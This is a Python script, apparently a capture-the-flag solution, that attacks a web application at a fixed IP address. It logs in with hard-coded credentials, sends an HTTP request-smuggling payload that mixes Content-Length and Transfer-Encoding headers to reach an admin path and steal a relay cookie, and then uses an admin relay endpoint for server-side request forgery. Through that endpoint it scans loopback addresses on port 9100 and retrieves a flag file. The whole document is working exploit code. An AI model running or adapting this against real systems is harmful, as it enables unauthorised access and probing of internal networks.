import re, html, socket, requests

host = "194.102.62.166"
port = 24956
base = f"http://{host}:{port}"

def smuggle_admin(session_cookie: str):
    sm = f"GET /admin HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
    size = f"{len(sm):x}"          # "33"
    body = f"{size}\r\n" + sm + "\r\n0\r\n\r\n"
    cl = len(f"{size}\r\n")        # 4

    req = (
        f"POST /forum/post HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: session={session_cookie}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
        + body +
        f"GET /forum HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: session={session_cookie}\r\n"
        f"Connection: close\r\n\r\n"
    )

    sock = socket.create_connection((host, port), timeout=6)
    sock.sendall(req.encode())
    sock.settimeout(8)
    resp = b""
    try:
        while True:
            d = sock.recv(8192)
            if not d:
                break
            resp += d
    except Exception:
        pass
    sock.close()
    text = resp.decode("latin1", "replace")
    m = re.search(r"Set-Cookie:\s*relay_auth=([^;\r\n]+);", text, re.I)
    return m.group(1) if m else None

def relay_req(sess: requests.Session, node: str):
    r = sess.post(base + "/admin/relay", data={"inventory_node": node}, timeout=10)
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    return html.unescape(m.group(1)) if m else r.text

s = requests.Session()
login = s.post(base + "/login", data={"username": "AlexGoodwin", "password": "Pine123"}, allow_redirects=False)
if login.status_code != 302:
    raise SystemExit("Login failed")

session_cookie = s.cookies.get("session")
relay_auth = smuggle_admin(session_cookie)
if not relay_auth:
    raise SystemExit("Smuggling failed (no relay_auth cookie)")

s.cookies.set("relay_auth", relay_auth, domain=host, path="/admin")

# find live nodes
live = []
for i in range(1, 255):
    ip = f"127.0.0.{i}"
    out = relay_req(s, f"http://{ip}:9100/")
    if "Status: 200" in out:
        live.append(ip)
print("live nodes:", live)

# pull flag from discovered revenge node/path
flag_out = relay_req(s, "http://127.0.0.241:9100/drops/pacific/batch-44c/vault/sealed/flag")
print(flag_out)